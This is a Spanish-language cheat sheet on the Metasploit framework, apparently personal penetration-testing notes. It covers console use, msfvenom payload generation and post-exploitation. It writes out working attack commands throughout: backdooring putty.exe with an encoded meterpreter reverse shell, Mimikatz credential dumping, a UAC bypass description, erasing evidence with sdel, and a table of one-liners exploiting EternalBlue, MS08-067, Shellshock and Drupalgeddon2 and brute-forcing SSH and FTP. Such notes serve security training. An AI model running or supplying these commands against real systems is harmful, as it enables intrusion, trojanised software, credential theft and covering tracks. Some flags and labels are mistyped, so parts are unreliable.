# Metasploit

## Introducción

No es una herramienta como tal, es un framework, es decir, un conjunto de herramientas, que nos permite realizar el proceso de explotación de manera sencilla.

_Se instala por defecto en -> `/usr/share/metasploit-framework`_

Dentro de este directorio tienes `modules`, `plugins`, `scripts`, `db`, `tools` y más.

Dentro de `modules` en `exploits` tenemos un montón de programas escritos en Ruby, lenguaje que usa Metasploit, que aprovechan diferentes vulnerabilidades.

Dentro de `modules` en `payloads` hay otras 3 carpetas

* `singles` (son payloads autocontenidos, no necesitan ni siquiera de metasploit para, por ejemplo, recibir una conexión)
* `stagers` (payloads pequeños que establecen una conexión con una maquina y devuelven una reversa para después descargan o aprovechan uno de los payloads de "stages" para realizar alguna acción)
* `stages` (hacen acciones mucho más avanzadas, uno de los más conocidos es "meterpreter.rb", pero hay muchos más)

## Básicos

* La interfaz de consola de metasploit

```bash
msfconsole
```

* Con el comando `help` te aparecen todas las opciones, nos centramos en "Core Commands"
* Con `connect` es el símil de nc (_netcat, herramienta utilizada para establecer una conexion TCP entre un nodo de la red y otro_) pero de metasploit.

```bash
connect
```

* Con `search` busca exploits.

```bash
search
```

```java
search cve:2024-6387
```

* Para usar el exploit usamos `use "exploit"`, con `back` sales.

```bash
use "exploit"
```

* Con `show options` vemos las opciones imprescindibles que hay que poner en el exploit, pero con "show advanced" muestra todas las opciones del exploit.

```bash
show options
```

```bash
show advanced
```

* Con `set` establecemos cosas.

```bash
set
```

* Con `show payloads` muestra los payloads que puedes poner en el exploit.

```bash
show payloads
```

* Importante seleccionar un payload (set), si no, no hace nada.
* Con `exploit` lo ejecutas.

```bash
exploit
```

### Integración con Nessus

* Se escanea con Nessus de forma normal y se importa en Metasploit con `db_import`.
* Con `hosts` te muestra los host almacenados en la base de datos de metasploit.
* Con `vulns` mustra las vulnerabilidades que ha encontrado Nessus.
* Con `services` lista los servicios abiertos

### Meterpreter

```java
use exploit /multi/handler
```

Una vez conectado con meterpreter puedes hacer uso de los módulos de Metasploit.

Con el comando help ves muchas cosas que puedes hacer con Meterpreter.

## Msfvenom

* \
  Con `info` dentro de un exploit te da toda la información relativa al exploit que estés usando.
* Si el exploit es de "Rank: Manual" es posible que haya que editarlo.

### Introducción

* Es un generador de payloads de metasploit.
* Se entra poniendo `msfvenom`.

```bash
msfvenom
```

* Los payloads se encuentran en -> /usr/share/metasploit-framework/modules/payloads
* Se usa `msfvenom -p` ruta del payload que queremos editar y usar `lhost="Ip de escucha"` `lport="puerto de escucha"`

```bash
msfvenom -p "ruta del payload" lhost="Ip de escucha" lport="puerto de escucha"
```

* Los payloads se pueden añadir a los exploits que encuentres por internet.
* Para recibir un meterpreter (una consola mejor) es mejor usar el exploit de metasploit -> `exploit/multi/handler`, hay que ponerle el payload generado con msfvenom.
* Con `-f` le dices el formato que quieres que tenga y `> nombre.loquesea` creas el fichero con el payload.

`multi/handler` _sirve para ponerse a la escucha, importante poner el mismo payload que vas a usar._

### Backdoors en binarios

Es hacer que un programa legitimo nos devuelva una reverse shell al ejecutarse.

Como ejemplo se usara Putty:

#### Creación del archivo

```bash
msfvenom -a x86 --plataform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX,exe
```

`-a` -> Indica la plataforma donde se va a ejecutar

`--plataform` -> Indica el SO

`-x` -> El nombre del ejecutable

`-p` -> Payload que se va a utilizar

`lhost` -> Ip de escucha

`lport` -> Puerto de escucha

`-e` -> Para codificar

`-i` -> Buretas de codificación

`-b` -> Omitir caracteres

`-f` -> formato del output

`-o` -> nombre del output

#### Migrar este proceso:

Esto es para que no se cierre la sesión cuando se cierre el programa.

En meterpreter:

```java
run post/windows/manage/migrate
```

### Crear Payload de meterprete - Python

Crear payload de meterprete para ejecutar con Python:

```bash
msfvenom -p python/meterpreter/reverse_tcp lhost=ip lport=puerto
```

Importante a la hora de introducir el payload generado, sustituir las `'` por `\'`, para que no interfiera con la sintaxis de Python, además de añadir:

```bash
f'python -c "payload"'
```

### Metasploit - Post Esplotación

Una vez dentro de la maquina objetivo, podemos hacer uso de los modulos de post explotacion de Metasploit, la ruta por defecto de estos modulos es:

```java
/usr/share/metasploit-framework/modules/post
```

Para usar estos modulos es recomendable hacer uso de **Meterpreter**, y se ejecutan asi:

```bash
run explit en cuestion
```

Recomendador de exploits:

```javascript
use post/multi/recon/local_exploit_suggester
```

#### UAC Bypass

Es el cuadradito de darle a si cuando ejecutas algo como admin.

Básicamente es editar la rama del registro de Windows con un binario que se ejecuta como administrador, a la que como usuario tenemos acceso y podemos editar, para que cargue lo que quieras, por ejemplo, una PowerShell, al ser un binario auto elevado, ejecuta la PowerShell con privilegios de administrador.

Con Meterpreter hay modulos para explotar esto.

#### Volcado de memoria con Mimikatz

Este programa nos permite extraer: contraseñas, PIN code, hash, kerberos tickets de la memoria en Windows.

Muchos antivirus lo detectan!!!!

Con una sesión de Meterpreter podemos hacer uso del módulo `kiwi`:

```bash
help kiwi
```

Con este comando se ven todas las opciones que hay, consultar GitHub para más info.

## Borrado para Windows

Con el meterpreter normal de metasploit hacemos uso de uno de sus módulos, encargado de eliminar evidencias en Windows, sobrescribe el fichero:

```java
run post/windows/manage/sdel FILE=C:\\user\\User\\Desktop\\Prueba.tx
```

## Ampliación de Comandos

<table><thead><tr><th width="54.2618408203125">No.</th><th>Command</th><th>Explanation</th></tr></thead><tbody><tr><td>1</td><td>metasploit</td><td>Launch the Metasploit framework<br>for exploit development and<br>execution.</td></tr><tr><td>2</td><td>msfconsole</td><td>Open the Metasploit console<br>interface.</td></tr><tr><td>3</td><td>msfvenom -p windows/meterpreter/reverse_tcp<br>LHOST=192.168.1.2 LPORT=4444 -f exe > shell.exe</td><td>Generate a Metasploit payload</td></tr><tr><td>4</td><td>msfconsole -r script.rc</td><td>Run Metasploit commands from a<br>script file.</td></tr><tr><td>5</td><td>msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;<br>set RHOST 192.168.1.1; exploit"</td><td>Exploit EternalBlue vulnerability.</td></tr><tr><td>6</td><td>msfconsole -x "use exploit/multi/handler; set PAYLOAD<br>windows/meterpreter/reverse_tcp; set LHOST 192.168.1.2; set<br>LPORT 4444; exploit"</td><td>Setup and run a multi-handler for<br>reverse TCP payloads.</td></tr><tr><td>7</td><td>msfconsole -x "use exploit/windows/smb/psexec; set RHOST<br>192.168.1.1; set SMBUser user; set SMBPass pass; exploit"</td><td>Exploit SMB with psexec</td></tr><tr><td>8</td><td>msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOSTS<br>192.168.1.0/24; set THREADS 10; run"</td><td>TCP port scan using Metasploit.</td></tr><tr><td>9</td><td>msfconsole -x "use auxiliary/scanner/http/http_version; set<br>RHOSTS 192.168.1.0/24; run"</td><td>Scan all ports (1-65535) instead of just<br>default ports.Scan HTTP versions on a network.</td></tr><tr><td>10</td><td>msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS<br>192.168.1.0/24; set USER_FILE /path/to/users.txt; set PASS_FILE<br>/path/to/passwords.txt; run"</td><td>Brute-force FTP login</td></tr><tr><td>11</td><td>msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS<br>192.168.1.0/24; set USER_FILE /path/to/users.txt; set PASS_FILE<br>/path/to/passwords.txt; run"</td><td>Brute-force SSH login.</td></tr><tr><td>12</td><td>msfconsole -x "use auxiliary/scanner/smb/smb_version; set<br>RHOSTS 192.168.1.0/24; run"</td><td>Scan SMB versions on a network.</td></tr><tr><td>13</td><td>msfconsole -x "use auxiliary/scanner/smb/smb_enumshares; set<br>RHOSTS 192.168.1.0/24; run"</td><td>Enumerate SMB shares on a<br>network.</td></tr><tr><td>14</td><td>msfconsole -x "use auxiliary/scanner/smb/smb_enumusers; set<br>RHOSTS 192.168.1.0/24; run"</td><td>Enumerate SMB users on a<br>network.</td></tr><tr><td>15</td><td>msfconsole -x "use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS<br>192.168.1.0/24; run"</td><td>Scan for RDP services on a<br>network</td></tr><tr><td>16</td><td>msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set<br>RHOST 192.168.1.1; exploit"</td><td>Exploit MS08-067 vulnerability.</td></tr><tr><td>17</td><td>msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set<br>RHOST 192.168.1.1; exploit"</td><td>Exploit vsftpd 2.3.4 backdoor.</td></tr><tr><td>18</td><td>msfconsole -x "use exploit/windows/dcerpc/ms03_026_dcom; set<br>RHOST 192.168.1.1; exploit"</td><td>Exploit MS03-026 vulnerability.</td></tr><tr><td>19</td><td>msfconsole -x "use exploit/windows/smb/psexec; set RHOST<br>192.168.1.1; set SMBUser user; set SMBPass pass; exploit</td><td>Execute commands on Windows<br>via SMB and psexec.</td></tr><tr><td>20</td><td>msfconsole -x "use<br>exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOST<br>192.168.1.1; exploit"</td><td>Exploit Shellshock vulnerability.</td></tr><tr><td>21</td><td>msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;<br>set RHOST 192.168.1.1; exploit"</td><td>Exploit EternalBlue vulnerability</td></tr><tr><td>22</td><td>msfconsole -x "use exploit/multi/http/struts2_content_type_ognl;<br>set RHOST 192.168.1.1; exploit"</td><td>Exploit Struts2 Content-Type<br>OGNL injection.</td></tr><tr><td>23</td><td>msfconsole -x "use exploit/unix/webapp/drupal_drupalgeddon2;<br>set RHOST 192.168.1.1; exploit"</td><td>Exploit Drupalgeddon2<br>vulnerability.</td></tr><tr><td>24</td><td>msfconsole -x "use exploit/multi/php/php_cgi_arg_injection; set<br>RHOST 192.168.1.1; exploit"</td><td>Exploit PHP CGI Argument<br>Injection.</td></tr><tr><td>25</td><td>msfconsole -x "use<br>exploit/windows/browser/ms14_064_ole_code_execution; set<br>RHOST 192.168.1.1; exploit"</td><td>Exploit MS14-064 OLE Code<br>Execution.</td></tr></tbody></table>

